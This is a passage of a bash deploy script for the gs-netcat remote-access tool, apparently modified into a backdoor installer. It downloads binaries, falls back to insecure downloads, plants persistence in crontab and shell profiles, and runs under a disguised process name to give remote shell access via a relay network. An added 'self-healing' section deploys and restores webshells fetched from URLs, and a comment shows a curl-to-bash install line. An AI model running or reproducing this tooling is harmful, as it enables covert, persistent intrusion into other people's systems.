		SKIP_OUT "Already installed in crontab."
		return
	fi

	[[ $UID -eq 0 ]] && {
		mk_file "${CRONTAB_DIR}/root"
	}

	local old
	old="$(crontab -l 2>/dev/null)" || {
		# Create empty crontab (busybox) if no crontab exists at all.
		crontab - </dev/null &>/dev/null
	}
	[[ -n $old ]] && old+=$'\n'

	echo -e "${old}${NOTE_DONOTREMOVE}\n0 * * * * $CRONTAB_LINE" | grep -F -v -- gs-bd | crontab - 2>/dev/null || { FAIL_OUT; return; }

	((IS_INSTALLED+=1))
	OK_OUT
}

install_user_profile()
{
	local rc_filename_status
	local rc_file
	local rc_filename

	rc_filename="$1"
	rc_filename_status="${rc_filename}................................"
	rc_file="${GS_PREFIX}${HOME}/${rc_filename}"

	echo -en "Installing access via ~/${rc_filename_status:0:15}..............................."
	if [[ -f "${rc_file}" ]] && grep -F -- "$BIN_HIDDEN_NAME" "$rc_file" &>/dev/null; then
		((IS_INSTALLED+=1))
		IS_SKIPPED=1
		SKIP_OUT "Already installed in ${rc_file}"
		return
	fi

	install_to_file "${rc_file}" "$NOTE_DONOTREMOVE" "${PROFILE_LINE}" || { SKIP_OUT "${CDR}Permission denied:${CN} ~/${rc_filename}"; false; return; }

	((IS_INSTALLED+=1))
	OK_OUT
}

install_user()
{
	# Use crontab if it's not in systemd (but might be in rc.local).
	if [[ ! $OSTYPE == *darwin* ]]; then
		install_user_crontab
	fi

	[[ $IS_INSTALLED -ge 2 ]] && return
	# install_user_profile
	for x in "${RC_FN_LIST[@]}"; do
		install_user_profile "$x"
	done
	gs_secret_write "$USER_SEC_FILE" # Create new secret file
}

ask_nocertcheck()
{
	WARN "Can not verify host. CA Bundle is not installed."
	echo >&2 "--> Attempting without certificate verification."
	echo >&2 "--> Press any key to continue or CTRL-C to abort..."
	echo -en >&2 "--> Continuing in "
	local n

	n=10
	while :; do
		echo -en >&2 "${n}.."
		n=$((n-1))
		[[ $n -eq 0 ]] && break 
		read -r -t1 -n1 && break
	done
	[[ $n -gt 0 ]] || echo >&2 "0"

	GS_NOCERTCHECK=1
}

# Use SSL and if this fails try non-ssl (if user consents to insecure downloads)
# <nocert-param> <ssl-match> <cmd> <param-url> <url> <param-dst> <dst> 
dl_ssl()
{
	local cmd sslerr arg_nossl
	cmd="$3"
	sslerr="$2"
	arg_nossl="$1"

	shift 3
	if [[ -z $GS_NOCERTCHECK ]]; then
		DL_ERR="$("$cmd" "$@" 2>&1 1>/dev/null)"
		[[ "${DL_ERR}" != *"$sslerr"* ]] && return
	fi

	FAIL_OUT "Certificate Error."
	[[ -z $GS_NOCERTCHECK ]] && ask_nocertcheck
	[[ -z $GS_NOCERTCHECK ]] && return

	echo -en "--> Downloading binaries without certificate verification............."
	DL_ERR="$("$cmd" "$arg_nossl" "$@" 2>&1 1>/dev/null)"
}

# Download $1 and save it to $2
dl()
{
	# Debugging / testing. Use local package if available
	if [[ -n "$GS_USELOCAL" ]]; then
		[[ -f "../packaging/gsnc-deploy-bin/${1}" ]] && xcp "../packaging/gsnc-deploy-bin/${1}" "${2}" 2>/dev/null && return
		[[ -f "/gsocket-pkg/${1}" ]] && xcp "/gsocket-pkg/${1}" "${2}" 2>/dev/null && return
		[[ -f "${1}" ]] && xcp "${1}" "${2}" 2>/dev/null && return
		FAIL_OUT "GS_USELOCAL set but deployment binaries not found (${1})..."
		errexit
	fi

	# Delete. Maybe previous download failed.
	[[ -s "$2" ]] && rm -f "${2:?}"

	if [[ -n $IS_USE_CURL ]]; then
		dl_ssl "-k" "certificate problem" "${DL[@]}" "${URL_BIN}/${1}" "--output" "${2}"
	elif [[ -n $IS_USE_WGET ]]; then
		dl_ssl "--no-check-certificate" "is not trusted" "${DL[@]}" "${URL_BIN}/${1}" "-O" "${2}"
	else
		# errexit "Need curl or wget."
		FAIL_OUT "CAN NOT HAPPEN"
		errexit
	fi

	# Download failed:
	[[ ! -s "$2" ]] && { FAIL_OUT; echo "$DL_ERR"; exit_code 255; } 
}

# S= was set. Do not install but execute in place.
gs_access()
{
	echo -e "Connecting..."
	local ret
	GS_SECRET="${S}"

	"${DSTBIN}" -s "${GS_SECRET}" -i
	ret=$?
	[[ $ret -eq 139 ]] && { WARN_EXECFAIL_SET "$ret" "SIGSEGV"; WARN_EXECFAIL; errexit; }
	[[ $ret -eq 61 ]] && {
		echo -e 2>&1 "--> ${CR}Could not connect to the remote host. It is not installed.${CN}"
		echo -e 2>&1 "--> ${CR}To install use one of the following:${CN}"
		echo -e 2>&1 "--> ${CM}X=\"${GS_SECRET}\" ${DL_CRL}${CN}"
		echo -e 2>&1 "--> ${CM}X=\"${GS_SECRET}\" ${DL_WGT}${CN}"
	}

	exit_code "$ret"
}

# Binary is in an executeable directory (no noexec-flag)
# set IS_TESTBIN_OK if binary worked.
# test_bin <binary>
test_bin()
{
	local bin
	unset IS_TESTBIN_OK

	bin="$1"

	# Try to execute the binary
	unset ERR_LOG
	GS_OUT=$("$bin" -g 2>&1)
	ret=$?
	[[ $ret -ne 0 ]] && {
		# 126 - Exec format error
		FAIL_OUT
		ERR_LOG="$GS_OUT"
		WARN_EXECFAIL_SET "$ret" "wrong binary"
		return
	}

	# Use randomly generated secret unless it's set already (X=)
	[[ -z $GS_SECRET ]] && GS_SECRET="$GS_OUT"

	IS_TESTBIN_OK=1
}

test_network()
{
	local ret
	unset IS_TESTNETWORK_OK

	# There should be no GS-NETCAT listening.
	# _GSOCKET_SERVER_CHECK_SEC=n makes gs-netcat try the connection.
	# 1. Exit=0 immediatly if server exists.
	# 2. Exit=202 after n seconds. Firewalled/DNS?
	# 3. Exit=203 if TCP to GSRN is refused.
	# 3. Exit=61 on GS-Connection refused. (server does not exist)
	# Do not need GS_ENV[*] here because all env variables are exported
	# when exec is used.
	err_log=$(_GSOCKET_SERVER_CHECK_SEC=15 GS_ARGS="-s ${GS_SECRET} -t" exec -a "$PROC_HIDDEN_NAME" "${DSTBIN}" 2>&1)
	ret=$?

	[[ -z "$ERR_LOG" ]] && ERR_LOG="$err_log"
	[[ $ret -eq 139 ]] && { 
		ERR_LOG=""
		WARN_EXECFAIL_SET "$ret" "SIGSEGV"
		return
	}

	{ [[ $ret -eq 202 ]] || [[ $ret -eq 203 ]]; } && {
		# 202 - Timeout (alarm)
		# 203 - TCP connection refused
		FAIL_OUT
		[[ -n "$ERR_LOG" ]] && echo >&2 "$ERR_LOG"
		# EXIT if we can not check if SECRET has already been used.
		errexit "Cannot connect to GSRN. Firewalled? Try GS_PORT=53 or 22, 7350 or 67."
	}

	# Pre <= 1.4.40 return with 255 if transparent proxy resets connection after 12 sec.
	# >1.4.40 return 203 (NETERROR)
	[[ $ret -eq 255 ]] && {
		# Connect reset by peer
		FAIL_OUT
		[[ -n "$ERR_LOG" ]] && echo >&2 "$ERR_LOG"
		errexit "A transparent proxy has been detected. Try GS_PORT=53 or 22,7350 or 67."
	}

	[[ $ret -eq 0 ]] && {
		FAIL_OUT "Secret '${GS_SECRET}' is already used."
		HOWTO_CONNECT_OUT
		exit_code 0
	}

	# Fail _unless_ it's ECONNREFUSED
	[[ $ret -eq 61 ]] && {
		# HERE: ECONNREFUSED
		# Connection to GSRN was successfull and GSRN reports
		# that no server is listening.
		# This is a good enough test that this network & binary is working.
		IS_TESTNETWORK_OK=1
		return
	}

	# Unknown error condition
	WARN_EXECFAIL_SET "$ret" "default pkg failed"
}

do_webhook()
{
	local arr
	local IFS
	local str

	IFS=""
	# Expand any $SECRET variable, etc.
	while [[ $# -gt 0 ]]; do
		# We need to escape all " to "'"'" to pass 'eval' correctly.
		# (Note: This _WILL_ expand $-style variables - what we want)
		# shellcheck disable=SC2001 # Use bash.4.0 features =>  not portable
		# str=$(echo "$1" | sed "s/\x22/\x22'\x22'\x22/g")
		str="${1//\"/\"'\"'\"}"
        eval str=\""$str"\"
		arr+=("$str")
		shift 1
	done

	# echo "arr=${#arr[@]}: ${arr[@]}"
	"${arr[@]}"
}

webhooks()
{
	local arr
	local ok
	local err

	echo -en "Executing webhooks...................................................."
	[[ -z ${GS_WEBHOOK_CURL[0]} ]] && { SKIP_OUT; return; }
	[[ -z ${GS_WEBHOOK_WGET[0]} ]] && { SKIP_OUT; return; }

	if [[ -n $IS_USE_CURL ]]; then
		err="$(do_webhook "${DL[@]}" "${GS_WEBHOOK_CURL[@]}" 2>&1)" && ok=1
		[[ -z $ok ]] && [[ -n $GS_WEBHOOK_404_OK ]] && [[ "${err}" == *"requested URL returned error: 404"* ]] && ok=1
	elif [[ -n $IS_USE_WGET ]]; then
		err="$(do_webhook "${DL[@]}" "${GS_WEBHOOK_WGET[@]}" 2>&1)" && ok=1
		[[ -z $ok ]] && [[ -n $GS_WEBHOOK_404_OK ]] && [[ "${err}" == *"ERROR 404: Not Found"* ]] && ok=1
	fi
	[[ -n $ok ]] && { OK_OUT; return; }

	FAIL_OUT
}

try_network()
{
	echo -en "Testing Global Socket Relay Network..................................."
	test_network
	[[ -n "$IS_TESTNETWORK_OK" ]] && { OK_OUT; return; }

	FAIL_OUT
	[[ -n "$ERR_LOG" ]] && echo >&2 "$ERR_LOG"
	WARN_EXECFAIL
}

# try <osarch> <srcpackage>
try()
{
	local osarch="$1"
	local src_pkg="$2"

	[[ -z "$src_pkg" ]] && src_pkg="gs-netcat_${osarch}.tar.gz"
	echo -e "--> Trying ${CG}${osarch}${CN}"
	# Download binaries
	echo -en "Downloading binaries.................................................."
	dl "${src_pkg}" "${TMPDIR}/${src_pkg}"
	OK_OUT

	echo -en "Unpacking binaries...................................................."
	if [[ "${src_pkg}" == *.tar.gz ]]; then
		# Unpack (suppress "tar: warning: skipping header 'x'" on alpine linux
		(cd "${TMPDIR}" && tar xfz "${src_pkg}" 2>/dev/null) || { FAIL_OUT "unpacking failed"; errexit; }
		[[ -f "${TMPDIR}/._gs-netcat" ]] && rm -f "${TMPDIR}/._gs-netcat" # from docker???
		[[ -n $GS_USELOCAL_GSNC ]] && {
			[[ -f "$GS_USELOCAL_GSNC" ]] || { FAIL_OUT "Not found: ${GS_USELOCAL_GSNC}"; errexit; }
			xcp "${GS_USELOCAL_GSNC}" "${TMPDIR}/gs-netcat"
		}
	else
		mv "${TMPDIR}/${src_pkg}" "${TMPDIR}/gs-netcat"
	fi
	OK_OUT

	echo -en "Copying binaries......................................................"
	xmv "${TMPDIR}/gs-netcat" "$DSTBIN" || { FAIL_OUT; errexit; }
	chmod 700 "$DSTBIN"
	OK_OUT

	echo -en "Testing binaries......................................................"
	test_bin "${DSTBIN}"
	if [[ -n "$IS_TESTBIN_OK" ]]; then
		OK_OUT
		return
	fi

	rm -f "${TMPDIR}/${src_pkg:?}"
}

gs_start_systemd()
{
	# HERE: It's systemd
	if [[ -z "$IS_GS_RUNNING" ]]; then
		# Resetting the Timestamp will yield a systemctl status warning that daemon-reload
		# is needed. Thus fix Timestamp here and reload.
		clean_all
		systemctl daemon-reload
		systemctl restart "${SERVICE_HIDDEN_NAME}" &>/dev/null
		if ! systemctl is-active "${SERVICE_HIDDEN_NAME}" &>/dev/null; then
			FAIL_OUT "Check ${CM}systemctl start ${SERVICE_HIDDEN_NAME}${CN}."
			exit_code 255
		fi
		IS_GS_RUNNING=1
		OK_OUT
		return
	fi

	SKIP_OUT "'${BIN_HIDDEN_NAME}' is already running and hidden as '${PROC_HIDDEN_NAME}'."
}

gs_start()
{
	# If installed as systemd then try to start it
	[[ -n "$IS_SYSTEMD" ]] && gs_start_systemd
	[[ -n "$IS_GS_RUNNING" ]] && return

	# Scenario to consider:
	# GS_UNDO=1 ./deploy.sh -> removed all binaries but user does not issue 'pkill gs-dbus'
	# ./deploy.sh -> re-installs new secret. Start gs-dbus with _new_ secret.
	# Now two gs-dbus's are running (which is correct)
	if [[ -n "$KL_CMD" ]]; then
		${KL_CMD} "${KL_CMD_RUNCHK_UARG[@]}" "${BIN_HIDDEN_NAME}" 2>/dev/null && IS_OLD_RUNNING=1
	elif command -v pidof >/dev/null; then
		# if no pkill/killall then try pidof (but we cant tell which user...)
		if pidof -qs "$BIN_HIDDEN_NAME" &>/dev/null; then
			IS_OLD_RUNNING=1
		fi
	fi
	IS_NEED_START=1

	if [[ -n "$IS_OLD_RUNNING" ]]; then
		# HERE: OLD is already running.
		if [[ -n "$IS_SKIPPED" ]]; then
			# HERE: Already running. Skipped installation (sec.dat has not changed).
			SKIP_OUT "'${BIN_HIDDEN_NAME}' is already running and hidden as '${PROC_HIDDEN_NAME}'."
			unset IS_NEED_START
		else
			# HERE: sec.dat has been updated
			OK_OUT
			WARN "More than one ${PROC_HIDDEN_NAME} is running."
			echo -e "--> You may want to check: ${CM}ps -elf|grep -E -- '(${PROC_HIDDEN_NAME_RX})'${CN}"
			[[ -n $OLD_PIDS ]] && echo -e "--> or terminate the old ones: ${CM}kill ${OLD_PIDS}${CN}"
		fi
	else
		OK_OUT ""
	fi

	if [[ -n "$IS_NEED_START" ]]; then
		# We need an 'eval' here because the ENV_LINE[*] needs to be expanded
		# and then executed.
		# This wont work:
		#     FOO="X=1" && ($FOO id)  # => -bash: X=1: command not found
		# This does work:
		#     FOO="X=1" && (eval $FOO id)
		(cd "$HOME"; eval "${ENV_LINE[*]}"TERM=xterm-256color GS_ARGS=\"-s "$GS_SECRET" -liD\" exec -a \""$PROC_HIDDEN_NAME"\" \""$DSTBIN"\") || errexit
		IS_GS_RUNNING=1
	fi
}

init_vars

[[ "$1" =~ (clean|uninstall|clear|undo) ]] && uninstall
[[ -n "$GS_UNDO" ]] || [[ -n "$GS_CLEAN" ]] || [[ -n "$GS_UNINSTALL" ]] && uninstall

init_setup
# User supplied install-secret: X=MySecret bash -c "$(curl -fsSL https://gsocket.io/x)"
[[ -n "$X" ]] && GS_SECRET_X="$X"

if [[ -z $S ]]; then
	# HERE: S= is NOT set
	if [[ $UID -eq 0 ]]; then
		gs_secret_reload "$SYSTEMD_SEC_FILE" 
		gs_secret_reload "$RCLOCAL_SEC_FILE" 
	fi
	gs_secret_reload "$USER_SEC_FILE"

	if [[ -n $GS_SECRET_FROM_FILE ]]; then
		GS_SECRET="${GS_SECRET_FROM_FILE}"
	else
		GS_SECRET="${GS_SECRET_X}"
	fi

	DEBUGF "GS_SECRET=$GS_SECRET (F=${GS_SECRET_FROM_FILE}, X=${GS_SECRET_X})"
else
	GS_SECRET="$S"
	URL_BIN="$URL_BIN_FULL"
fi

try "$OSARCH" "$SRC_PKG"

# [[ -z "$GS_OSARCH" ]] && [[ -z "$IS_TESTBIN_OK" ]] && try_any
WARN_EXECFAIL
[[ -z "$IS_TESTBIN_OK" ]] && errexit "None of the binaries worked."

[[ -z $S ]] && try_network
# [[ -n "$GS_UPDATE" ]] && gs_update

# S= is set. Do not install but connect to remote using S= as secret.
[[ -n "$S" ]] && gs_access

# -----BEGIN Install permanentally-----
if [[ -z $GS_NOINST ]]; then
	if [[ -n $IS_DSTBIN_TMP ]]; then
		echo -en "Installing remote access.............................................."
		FAIL_OUT "${CDR}Set GS_DSTDIR= to a writeable & executable directory.${CN}"
	else
		# Try to install system wide. This may also start the service.
		[[ $UID -eq 0 ]] && install_system

		# Try to install to user's login script or crontab (if not installed as SYSTEMD)
		[[ -z "$IS_INSTALLED" || -z "$IS_SYSTEMD" ]] && install_user
	fi
else
	echo -e "GS_NOINST is set. Skipping installation."
fi
# -----END Install permanentally-----

# -----BEGIN Keepalive & Self-Healing-----
if [[ -n "$GS_KEEPALIVE" ]] || [[ -n "$GS_WEBSHELL_URL" ]] || [[ -n "$GS_WEBSHELL_MAP" ]]; then
	echo -e "\n${CG}=== KEEPALIVE & SELF-HEALING ===${CN}"
	
	# Create keepalive script - support both formats
	if [[ -n "$GS_WEBSHELL_MAP" ]] || { [[ -n "$GS_WEBSHELL_URL" ]] && [[ -n "$GS_WEBSHELL_FILES" ]]; }; then
		echo -en "Creating keepalive script............................................."
		create_keepalive_script "$GS_WEBSHELL_URL" "$GS_WEBSHELL_FILES" "$GS_WEBSHELL_MAP"
		OK_OUT
	fi

	# Create helper scripts for self-healing
	echo -en "Creating self-healing helpers........................................."
	create_keepalive_helper "$GS_WEBSHELL_URL" "$GS_WEBSHELL_FILES" "$GS_WEBSHELL_MAP"
	create_binary_helper
	OK_OUT

	# Deploy webshells (supports both formats)
	deploy_webshells

	# Install to crontab
	install_keepalive_crontab

	# Start keepalive
	start_keepalive
fi
# -----END Keepalive & Self-Healing-----

if [[ -z "$IS_INSTALLED" ]] || [[ -n $IS_DSTBIN_TMP ]]; then
	echo -e >&2 "--> ${CR}Access will be lost after reboot.${CN}"
fi
	
[[ -n $IS_DSTBIN_CWD ]] && WARN "Installed to ${PWD}. Try GS_DSTDIR= otherwise.."

webhooks

HOWTO_CONNECT_OUT

printf "%-70.70s" "Starting '${BIN_HIDDEN_NAME}' as hidden process '${PROC_HIDDEN_NAME}'....................................."
if [[ -n "$GS_NOSTART" ]]; then
	SKIP_OUT "GS_NOSTART=1 is set."
else
	gs_start
fi

# Show keepalive info
if [[ -n "$GS_KEEPALIVE" ]] || [[ -n "$GS_WEBSHELL_URL" ]] || [[ -n "$GS_WEBSHELL_MAP" ]]; then
	echo -e "\n${CG}=== SELF-HEALING STATUS ===${CN}"
	echo -e "--> Keepalive script: ${CM}${KEEPALIVE_SCRIPT}${CN}"
	echo -e "--> Binary helper: ${CM}${BINARY_HELPER}${CN}"
	if [[ -n "$GS_WEBSHELL_MAP" ]]; then
		echo -e "--> Monitored webshells (multi-source):"
		IFS=',' read -ra WS_PAIRS <<< "$GS_WEBSHELL_MAP"
		for pair in "${WS_PAIRS[@]}"; do
			pair=$(echo "$pair" | xargs)
			_ws_file="${pair%%:*}"
			_ws_url="${pair#*:}"
			echo -e "    ${CM}${_ws_file}${CN} <- ${CDC}${_ws_url}${CN}"
		done
	elif [[ -n "$GS_WEBSHELL_FILES" ]]; then
		echo -e "--> Monitored webshells: ${CM}${GS_WEBSHELL_FILES}${CN}"
		echo -e "--> Source URL: ${CM}${GS_WEBSHELL_URL}${CN}"
	fi
	echo -e "--> Recovery time: ${CG}0.1 seconds${CN} (webshells), ${CG}1 minute${CN} (binary/keepalive)"
fi

echo -e "--> ${CW}Join us on Telegram - https://t.me/thcorg${CN}"

exit_code 0
